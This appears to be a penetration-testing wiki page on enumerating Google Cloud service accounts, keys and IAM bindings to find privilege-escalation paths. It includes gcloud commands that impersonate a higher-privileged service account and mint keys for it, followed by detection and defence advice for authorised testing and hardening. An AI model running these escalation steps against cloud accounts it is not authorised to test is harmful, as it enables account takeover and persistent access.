---
title: GCP service account enumeration
slug: gcp-service-account-enum
---

> **TL;DR:** Walk projects → IAM bindings → service accounts → keys, with the default Compute SA + project-level Editor as the classic worst-case finding.

## What it is
GCP IAM binds *members* (users, groups, service accounts) to *roles* at *resource* scope (organisation, folder, project, individual resource). A foothold in a project means enumerating: which SAs exist, which keys they have, what roles they hold at each scope, and which workloads run as them. The two killer defaults are (1) the project-default Compute Engine service account (`<projectnum>-compute@developer.gserviceaccount.com`) which gets `roles/editor` at project scope unless explicitly removed, and (2) the App Engine default SA with the same problem. Service Account Token Creator (`iam.serviceAccounts.getAccessToken`) and ActAs (`iam.serviceAccounts.actAs`) on a higher-priv SA are the canonical lateral pivots.

## Preconditions / where it applies
- Authenticated GCP context: a user, a key file, or a metadata-server token.
- Some read on Resource Manager / IAM (`resourcemanager.projects.get`, `iam.serviceAccounts.list`).
- For deeper enum: `cloudasset.assets.searchAllIamPolicies` at org/folder scope.

## Technique
1. Identify yourself and project scope.
2. List service accounts and their keys.
3. Map IAM bindings to find escalation paths (TokenCreator / ActAs / Owner).

```bash
gcloud auth list
gcloud config get-value project
gcloud projects list
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account <sa>@<proj>.iam.gserviceaccount.com
```

```bash
# Project-level bindings
gcloud projects get-iam-policy $(gcloud config get-value project) --format=json \
  | jq '.bindings[] | select(.role | test("admin|owner|editor|tokenCreator|actAs"; "i"))'

# Org-wide with Cloud Asset (if allowed)
gcloud asset search-all-iam-policies --scope=organizations/<orgid> \
  --query="policy:roles/iam.serviceAccountTokenCreator"
```

```bash
# Impersonate a more-privileged SA
gcloud auth print-access-token --impersonate-service-account=target-sa@proj.iam.gserviceaccount.com

# Or mint a key on it (if iam.serviceAccountKeys.create allowed)
gcloud iam service-accounts keys create k.json \
  --iam-account=target-sa@proj.iam.gserviceaccount.com
```

`GCPBucketBrute`, `gcp_enum.sh` (Rhino Security Labs), and Hayden Smith's `gcp_scanner` automate large parts of this. IAM Recommender data (when readable) lists over-privileged accounts — a recon goldmine.

## Detection and defence
- Cloud Audit Logs: alert on `SetIamPolicy`, `CreateServiceAccountKey`, and `GenerateAccessToken` calls.
- Disable automatic role grant to default Compute / App Engine SAs (org policy `iam.automaticIamGrantsForDefaultServiceAccounts`).
- Replace SA keys with Workload Identity Federation; cap key lifetime via `iam.serviceAccountKeyExpiry`.
- Related: [[gcp-metadata-server]], [[aws-iam-enum]].

## References
- [GCP — Service account permissions](https://cloud.google.com/iam/docs/service-account-permissions) — official ActAs/TokenCreator semantics.
- [HackTricks Cloud — GCP IAM enumeration](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-services/gcp-iam-and-org-policies-enum.html) — practical commands and escalation paths.
- [Rhino — GCP penetration testing](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation) — catalogued IAM escalation primitives.

See also: [[gke-workload-identity-abuse]], [[gcp-cloud-build-trigger-abuse]], [[gcp-iam-misconfig]], [[gcp-metadata-server]]
